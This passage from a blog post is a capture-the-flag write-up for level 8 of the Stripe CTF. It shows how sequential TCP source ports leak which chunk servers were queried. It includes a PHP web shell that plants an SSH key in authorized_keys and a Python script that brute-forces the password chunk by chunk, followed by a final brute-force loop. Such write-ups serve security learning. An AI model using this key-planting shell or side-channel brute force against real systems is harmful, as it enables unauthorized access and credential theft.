[127.0.0.1:58881:1] Responding with: '{"success": false}\n'
[127.0.0.1:58877:1] Going to wait 0.0 seconds before responding
[127.0.0.1:58877:1] Request already finished!
[127.0.0.1:58877:1] Responding with: '{"success": false}\n'
[127.0.0.1:58877:1] Sending webhook to (u'localhost', 1111): {'success': False}
Releasing lock
</code>
The observation is this: the logs are showing you the TCP source port (i.e. "[127.0.0.1:<strong>58877</strong>:1] Sending webhook to (u'localhost', 1111): {'success': False}") are sequential.</p>

<p>Knowing that source ports are sequential allows us to know how many chunk servers the PasswordDB server queried before responding.  If the source port for the response to our request is N, and the source port for the request to the webhook is N+2, only 1 chunk server was queried.  If the request to the webhook has a source port of N+3, then 2 chunk servers were queried.</p>

<p>The actual PasswordDB is running behind Apache, so the source port for the response won't be dependent on Twisted.  To solve that, we send two requests with the same guess and look at the difference in source ports between sequential requests to our webhook.  Now, we can bruteforce the 12 digit password by bruteforcing 4 3-digit chunks individually, which is doable in a reasonable amount of time.</p>

<p>PasswordDB can only make outbound requests to other Stripe servers so we have to run a script from somewhere on the Stripe server.  Luckily we can get ssh access to the level 2 server by uploading a php script that puts a public key in ~/.authorized_hosts:</p>

<p><code>php
&lt;?php
$output = `echo "ssh-rsa MY_PUBLIC_KEY ssh" &gt; ../../.ssh/authorized_keys`;
echo "&lt;pre&gt;$output&lt;/pre&gt;";
?&gt;
</code>
<img src="/assets/images/stripe-ctf/level8-shell.png" alt="Level 8 Shell" /></p>

<p>To brute force the password chunk by chunk, we send two requests with the same guess to PasswordDB and look at the difference in source ports between responses to our webhook.  If the difference when guessing the first chunk is 3, then PasswordDB made 2 requests between responding to us, and thus queried the 2nd chunk server.  Likewise if the difference when guessing the 2nd chunk is 4, and guessing the 3rd chunk is 5.  I found that due to what's probably other users on the same challenge, I would sometimes get source port differences that were wildly off.  I solved this sub optimally: any time that I have a source port difference greater than what I expect I wait 5 seconds and try again.  If I keep getting source port differences greater than the expected 5 times in a row, I probably correctly guessed a chunk.  This is a very suboptimal way to do it, and my script took a couple of hours to finish.</p>

<p>``` python
import socket, ssl, time</p>

<p>def make_guess(request):</p>

<pre><code>try:
    p1 = get_source_port(request)
    p2 = get_source_port(request)
    return p2 - p1
except:
    print "something bad happened, trying again"
    return make_guess(request)
</code></pre>

<p>def get_source_port(request):</p>

<pre><code>client = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
client.connect((HOST, PORT))
client.sendall(request)
resp = ""
while 1:
    data = client.recv(1024)
    if data == "0\r\n\r\n": break
source_port1 = client.getsockname()[1]
client.close()
conn, addr = server.accept()
conn.send("HTTP/1.0 200 OK\r\n")
conn.close()
return addr[1]
</code></pre>

<p>HOST = 'level08-1.stripe-ctf.com'
PORT = 443
HOST2 = 'level02-2.stripe-ctf.com'
PORT2 = 12455
server =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', PORT2))
server.listen(1)
guess = ""
for chunk in range(3):</p>

<pre><code>if chunk == 0:
    start = 128
else:
    start = 0
for i in range(start,1000):
    chunk_guess = str(i).zfill(3)
    message = '{"password": "' + guess + chunk_guess + 'X'*(12 - len(guess+chunk_guess)) + '", "webhooks": ["level02-2.stripe-ctf.com:12455"]}'
    request = 'POST /user-umqrrcvswp/ HTTP/1.1\r\nUser-Agent: curl/7.21.4 (universal-apple-darwin11.0) libcurl/7.21.4 OpenSSL/0.9.8r zlib/1.2.5\r\nHost: level08-1.stripe-ctf.com\r\nAccept: */*\r\nContent-Length: '+ str(len(message)) + '\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n' + message
    print "Guessing (chunk " + str(chunk) + ") :" + chunk_guess
    correct = True
    for i in range(5): #fucking network jitter
        diff = make_guess(request)
        print diff
        if diff == chunk+2:
            correct = False
            break
        else:
            print "just in case lets sleep"
            time.sleep(5)
    if correct:
        print "Got Chunk:", chunk_guess
        guess += chunk_guess
        break
</code></pre>

<p>print "Got 3/4ths of password:", guess
```</p>

<p>The above code gets the first 3 chunks.  Any password guess that has the first 9 digits correct will have to query the 4th chunk server, so there is no difference in source ports between correct and incorrect guesses after the first 9 digits are correct.  The rest of the password has to be bruteforced directly:</p>

<p><code>python
In [14]: for i in range(1000):   
....:     guess = str(i).zfill(3)
....:     r = requests.post("https://level08-1.stripe-ctf.com/user-umqrrcvswp/",data ='{"password": "350080833' + guess + '", "webhooks": []}')
....:     print "Tried:", guess   
....:     if r.text.strip() == '{"success": true}':   
....:         print "Got it: ", guess   
....:         break
</code></p>

<h2>The End</h2>

<p>And there you have it.</p>

<p><img src="/assets/images/stripe-ctf/the-end.png" alt="The End" /></p>
]]></content>
  </entry>
  
</feed>
